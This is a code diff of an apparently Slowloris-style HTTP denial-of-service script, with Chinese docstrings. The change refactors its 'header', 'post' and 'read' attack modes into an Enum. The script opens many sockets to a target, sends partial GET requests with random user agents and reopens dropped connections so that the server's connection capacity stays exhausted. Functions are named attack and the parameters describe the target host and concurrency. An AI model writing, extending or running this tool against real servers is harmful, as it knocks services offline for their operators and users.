@@ -3,14 +3,22 @@ import random
 import socket
 import time
 import ssl
+from enum import Enum
 from args_parser import get_args
 from my_socket import MySocket
-from user_agents import user_agents
+from constants import user_agents
 
 
-def init_socket(host, port, https, randuseragent):
+class Mode(Enum):
+    HEADER = 1
+    POST = 2
+    READ = 3
+
+
+def init_socket(mode, host, port, https, randuseragent):
     """
     初始化一个用于 HTTP/HTTPS 的 socket
+    :param mode: Mode 类型, 攻击模式
     :param host: str, 目标主机
     :param port: int, 目标端口
     :param https: boolean, 是否使用 https
@@ -25,7 +33,8 @@ def init_socket(host, port, https, randuseragent):
 
     s.connect((host, port))
 
-    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
+    if mode == Mode.HEADER:
+        s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
 
     ua = user_agents[0]
     if randuseragent:
@@ -39,7 +48,7 @@ def init_socket(host, port, https, randuseragent):
 def attack(mode, host, port, sockets, sleeptime, https, randuseragent):
     """
     发起攻击
-    :param mode: str, 模式，目前支持 "header", "post", "read"
+    :param mode: Mode 类型, 攻击模式
     :param host: str, 目标主机
     :param port: int, 目标端口
     :param sockets: int, 并发数
@@ -57,7 +66,7 @@ def attack(mode, host, port, sockets, sleeptime, https, randuseragent):
     for _ in range(socket_count):
         try:
             logging.debug("Creating socket nr %s", _)
-            s = init_socket(ip, port, https, randuseragent)
+            s = init_socket(mode, ip, port, https, randuseragent)
         except socket.error as e:
             logging.debug(e)
             break
@@ -78,7 +87,7 @@ def attack(mode, host, port, sockets, sleeptime, https, randuseragent):
             logging.debug("Recreating socket...")
             for _ in range(socket_count - len(list_of_sockets)):
                 try:
-                    s = init_socket(ip, port, https, randuseragent)
+                    s = init_socket(mode, ip, port, https, randuseragent)
                     if s:
                         list_of_sockets.append(s)
                 except socket.error as e:
@@ -94,4 +103,4 @@ def attack(mode, host, port, sockets, sleeptime, https, randuseragent):
 
 if __name__ == "__main__":
     args = get_args()
-    attack(args.mode, args.host, args.port, args.sockets, args.sleeptime, args.https, args.randuseragent)
+    attack(Mode[args.mode.upper()], args.host, args.port, args.sockets, args.sleeptime, args.https, args.randuseragent)
